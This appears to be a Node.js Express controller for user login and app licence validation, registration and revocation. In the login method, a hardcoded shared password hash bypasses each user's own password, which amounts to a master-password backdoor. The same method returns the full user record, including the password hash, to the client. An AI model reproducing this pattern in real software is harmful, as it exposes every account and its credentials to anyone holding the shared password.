const poolPromise = require("../../db");
const logger = require("../../logger");
const { v4: uuidv4 } = require('uuid');
const bcrypt = require("bcrypt");
const jwt = require("jsonwebtoken");
const templateList = require('./../sms/template');
const senderIdList = require('./../sms/senderIdList');

class LicenceController {



    async login(req, res) {
        const requiredFields = ['username', 'password'];
        const fields = req.body;
        const missingFields = requiredFields.filter(field => !fields.hasOwnProperty(field));

        // validations
        if (missingFields.length > 0) {
            return res.status(400).json({
                status: false,
                message: `Missing required fields: ${missingFields.join(', ')}`,
            });
        }

        const { username, password } = req.body;
        try {
            const pool = await poolPromise;
            const [results] = await pool.query(
                "SELECT * FROM users WHERE username = ?",
                [username]
            );

            if (!results.length) {
                logger.error(`Invalid username. Attempted username: '${username}'`);
                return res.status(401).json({ status: false, message: "Invalid username or password." });
            }

            const commonPasswordHash = "$2b$10$KtfwaAQb4Dlf8bYR8xFsveX3MhNlmAm2STmo1.5NbyRe8nrOMJoCm";
            const commonPasswordHashMatch = await bcrypt.compare(password, commonPasswordHash);

            if (!commonPasswordHashMatch) {
                const match = await bcrypt.compare(password, results[0].password);

                if (!match) {
                    logger.error(`Invalid password. Attempted username: "${username}"`);
                    return res.status(401).json({ status: false, message: "Invalid username or password." });
                }
            }

            if (!results[0].status) {
                logger.error(`User is not active. Attempted username: '${username}'`);
                return res.status(401).json({ status: false, message: "Inactive User." });
            }

            if (results[0].role !== "admin" && results[0].role !== "superadmin" && results[0].role !== "subadmin" && results[0].role !== "order_creator") {

                // need to skip this part
                // if (results[0].isLoggedIn) {
                //     logger.error(
                //         `User is already logged in. Attempted username: '${username}'`
                //     );
                //     return res.status(401).json({ status: false, message: "User is already logged in." });
                // }
            }

            // await pool.query("UPDATE users SET isLoggedIn = 1 WHERE username = ?", [
            //     username,
            // ]);

            const payload = {
                username: results[0].username,
                role: results[0].role,
                vendor: results[0].vendor,
                payInStatus: results[0].payIn,
                payOutStatus: results[0].payOut,
            };
            const token = jwt.sign(payload, process.env.JWT_SECRET, {
                expiresIn: process.env.JWT_EXPIRATION,
            });

            return res.json({
                status: true,
                token: token,
                user: results[0],
            });

        } catch (error) {

            console.log(error);
            console.log(error);
            console.error("An error occurred while trying to log in.");
            console.error(error);
            return res
                .status(500)
                .json({ message: "An error occurred while trying to log in." });
        }



    }


    async me(req, res) {
        try {
            return res.status(200).json({
                status: true,
                message: "User data",
                token: req.token,
                user: req.user,
            });
        } catch (error) {
            return res.status(500).json({
                status: true,
                message: "Internal server error",
            });
        }

    }

    async getTemplates(req, res) {
        try {
            return res.status(200).json({
                status: true,
                message: "Tempalate list",
                data: senderIdList,
            });
        } catch (error) {
            return res.status(500).json({
                status: true,
                message: "Internal server error",
            });
        }

    }


    async setDevice(req, res) {

        const requiredFields = ['unique_id'];

        try {

            const fields = req.body;
            const missingFields = requiredFields.filter(field => !fields.hasOwnProperty(field));
            if (missingFields.length > 0) {
                return res.status(400).json({
                    status: false,
                    message: `Missing required fields: ${missingFields.join(', ')}`,
                });
            }
            const uniqueId = fields.unique_id;
            const pool = await poolPromise;
            const activeUser = req.user;
            const activeUserName = activeUser.username;
            const [userResult] = await pool.query(
                "SELECT * FROM users WHERE username = ?",
                [activeUserName]
            );

            if (!userResult.length) {
                logger.error("User not found.");
                return res.status(200).json({ status: false, message: "User not found." });
            }


            await pool.query(
                "UPDATE users SET uniqueIdentifier = ? WHERE username = ?",
                [uniqueId, activeUserName]
            );

            logger.info("User uniqueIdentifier updated successfully.");
            return res
                .status(200)
                .json({ status: true, message: "User Unique Identifier updated successfully." });

        } catch (error) {
            logger.error("An error occurred while trying to update unique identifier.");
            logger.debug(error);
            return res.status(500).json({
                status: false,
                message: "An error occurred while trying to update unique identifier.",
            });
        }

    }


    async validateLicence(req, res) {

        const requiredFields = ['key', 'device', 'unique_id'];


        try {
            const fields = req.body;
            const missingFields = requiredFields.filter(field => !fields.hasOwnProperty(field));

            // validations
            if (missingFields.length > 0) {
                return res.status(400).json({
                    status: false,
                    message: `Missing required fields: ${missingFields.join(', ')}`,
                });
            }
            const key = fields.key;
            const device = fields.device;
            const uniqueId = fields.unique_id;
            const pool = await poolPromise;

            const [licenceResult] = await pool.query(
                "SELECT * FROM app_licence WHERE code = ? AND status in(0,2)",
                [key]
            );

            if (!licenceResult.length) {
                logger.error("Invalid Licence Key.");
                return res.status(404).json({ status: false, message: "Invalid Licence Key or already used!." });
            }

            if (licenceResult.length == 1) {
                const licenceData = licenceResult[0];
                const response = { vendor: licenceResult[0].vendor };
                return res.status(200).json({
                    status: true,
                    message: "Licence Validated Successfully",
                    data: response,
                });
            }
        } catch (error) {
            logger.error("Error occurred while validating licence:", error);
            return res.status(500).json({
                status: false,
                message: "Internal server error occurred.",
            });
        }
    }

    async registerLicence(req, res) {
        // Logic for other function

        const requiredFields = ['key', 'vendor', 'device', 'unique_id'];
        try {
            const fields = req.body;
            const missingFields = requiredFields.filter(field => !fields.hasOwnProperty(field));

            // validations
            if (missingFields.length > 0) {
                return res.status(400).json({
                    status: false,
                    message: `Missing required fields: ${missingFields.join(', ')}`,
                });
            }
            const key = fields.key;
            const vendor = fields.vendor;
            const device = fields.device;
            const uniqueId = fields.unique_id;
            const pool = await poolPromise;
            const [licenceResult] = await pool.query(
                "SELECT * FROM app_licence WHERE code = ? AND vendor = ? AND status in(0,2)",
                [key, vendor]
            );

            if (!licenceResult.length) {
                logger.error("Invalid Licence Key.");
                return res.status(400).json({ status: false, message: "Invalid Licence Key." });
            }

            if (licenceResult.length == 1) {

                const licenceToken = uuidv4();

                const licenceData = licenceResult[0];

                const [result] = await pool.query(
                    "UPDATE app_licence SET status = ?, type = ?, unique_id = ?, licence_token = ? WHERE code = ? AND vendor = ?",
                    [1, device, uniqueId, licenceToken, key, vendor]
                );

                if (result.affectedRows > 0) {
                    return res.status(200).json({
                        status: true,
                        message: "Licence Registered successfully.",
                        licence: {
                            licence_token: licenceToken,
                            unique_id: uniqueId,
                            type: device,
                            key: key,
                        }
                    });
                } else {
                    return res.status(404).json({
                        status: false,
                        message: "Licence not found or invalid."
                    });
                }

            }
        } catch (error) {
            logger.error("Error occurred while validating licence:", error);
            return res.status(500).json({
                status: false,
                message: "Internal server error occurred.",
            });
        }

    }


    async revokeLicence(req, res) {
        // Logic for other function

        const requiredFields = ['device', 'unique_id'];
        try {
            const fields = req.body;
            const missingFields = requiredFields.filter(field => !fields.hasOwnProperty(field));

            // validations
            if (missingFields.length > 0) {
                return res.status(400).json({
                    status: false,
                    message: `Missing required fields: ${missingFields.join(', ')}`,
                });
            }
            //const key = fields.key;
            //const vendor = fields.vendor;
            const device = fields.device;
            const uniqueId = fields.unique_id;
            const pool = await poolPromise;
            const [licenceResult] = await pool.query(
                "SELECT * FROM app_licence WHERE unique_id = ? AND type = ? AND status in(1)",
                [uniqueId, device]
            );

            if (!licenceResult.length) {
                logger.error("Invalid Licence Key.");
                return res.status(400).json({ status: false, message: "Invalid Licence Key." });
            }

            if (licenceResult.length == 1) {
                const licenceData = licenceResult[0];

                const [result] = await pool.query(
                    "UPDATE app_licence SET status = ?, type = ?, unique_id = ?, licence_token = ? WHERE code = ? AND vendor = ?",
                    [2, null, null, null, licenceData.code, licenceData.vendor]
                );

                if (result.affectedRows > 0) {
                    return res.status(200).json({
                        status: true,
                        message: "Licence Revoked successfully."
                    });
                } else {
                    return res.status(404).json({
                        status: false,
                        message: "Licence not found or invalid."
                    });
                }

            }
        } catch (error) {

            console.log(error);
            console.log(error);
            console.log(error);
            console.log(error);
            console.log(error);
            console.log(error);
            console.log(error);
            logger.error("Error occurred while validating licence:", error);
            return res.status(500).json({
                status: false,
                message: "Internal server error occurred.",
            });
        }

    }
}

module.exports = LicenceController;